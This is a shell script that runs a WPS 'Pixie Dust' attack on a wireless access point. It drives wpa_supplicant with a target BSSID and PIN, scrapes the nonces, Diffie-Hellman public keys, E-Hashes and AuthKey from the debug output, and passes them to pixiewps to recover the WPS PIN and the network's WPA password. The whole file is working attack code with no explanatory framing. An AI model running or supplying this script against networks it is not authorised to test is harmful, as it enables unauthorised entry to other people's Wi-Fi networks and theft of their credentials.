#!/bin/sh

TEMPDIR=$(mktemp -d)
TEMPFILE=$(mktemp --suffix=.conf)
IFACE="wlan0"

BSSID=$1
PIN=$2

function quit() 
{
	PID=$(jobs -l | awk '{print $2}')
	kill $PID
	rm -rf $TEMPDIR $TEMPFILE $PIPE
	exit
}

function gethex()
{
	echo $1 | cut -d : -f 3 | sed --expression='s/ //g'
}

echo -e "ctrl_interface=${TEMPDIR}\nctrl_interface_group=root\nupdate_config=1\n" > $TEMPFILE

sleep 2 && echo "WPS_REG $BSSID $PIN" | nc -u -U $TEMPDIR/$IFACE &

while read -r LINE
do

	if [ "$(echo "$LINE" | grep 'WPS: ')" ]
	then
		if [ "$(echo "$LINE" | grep 'Building Message M')" ]
		then
			echo '[*] Sending WPS Message: '
			echo "$LINE"
		fi
		
		if [ "$(echo "$LINE" | grep 'Received M')" ]
		then
			echo '[*] Received WPS Message: '
			echo "$LINE"
		fi
		
		if [ "$(echo "$LINE" | grep 'Received WSC_NACK')" ]
		then
			echo '[*] Received WSC NACK'
			echo '[-] Error: wrong PIN code'
		fi

		if [ "$(echo "$LINE" | grep 'Enrollee Nonce')" ]
		then
			ENONCE=$(gethex "$LINE")
			echo "E-Nonce: $ENONCE"
		fi

		if [ "$(echo "$LINE" | grep 'DH Private Key')" ] 
		then
			PKR=$(gethex "$LINE")
			echo "PKR: $PKR"
		fi
		
		if [ "$(echo "$LINE" | grep 'DH own Public Key')" ] 
		then
			PKR=$(gethex "$LINE")
			echo "PKR: $PKR"
		fi

		if [ "$(echo "$LINE" | grep 'DH peer Public Key')" ]
		then
			PKE=$(gethex "$LINE")
			echo "PKE: $PKE"
		fi

		if [ "$(echo "$LINE" | grep 'AuthKey')" ]
		then
			AUTHKEY=$(gethex "$LINE")
			echo "AuthKey: $AUTHKEY"
		fi
		if [ "$(echo "$LINE" | grep 'E-Hash1')" ]
		then
			EHASH1=$(gethex "$LINE")
			echo "E-Hash1: $EHASH1"
		fi
		if [ "$(echo "$LINE" | grep 'E-Hash2')" ]
		then
			EHASH2=$(gethex "$LINE")
			echo "E-Hash2: $EHASH2"
		fi
		
		if [ "$(echo "$LINE" | grep 'Network Key')" ]
		then
			WPA_KEY=$(gethex "$LINE")
			echo "WPA pass: $WPA_KEY"
		fi
		
	elif [ "$(echo "$LINE" | grep ': State: ')" ]
	then
		if [ "$(echo "$LINE" | grep '-> SCANNING')" ]
		then
			echo "[*] Scanning…"
		fi
		
	elif [ "$(echo "$LINE" | grep 'WPS-FAIL')" ]
	then
		echo "[-] wpa_supplicant returned WPS-FAIL"
	fi

	if [ "$PKE" ] && [ "$PKR" ] && [ "$EHASH1" ] && [ "$EHASH2" ] && [ "$ENONCE" ]
	then
		break
	fi

done <<<$(wpa_supplicant -K -d -D nl80211 -i $IFACE -c $TEMPFILE | tee /tmp/log)

pixiewps -e "$PKE" -r "$PKR" -s "$EHASH1" -z "$EHASH2" -a "$AUTHKEY" -n "$ENONCE" --force

quit
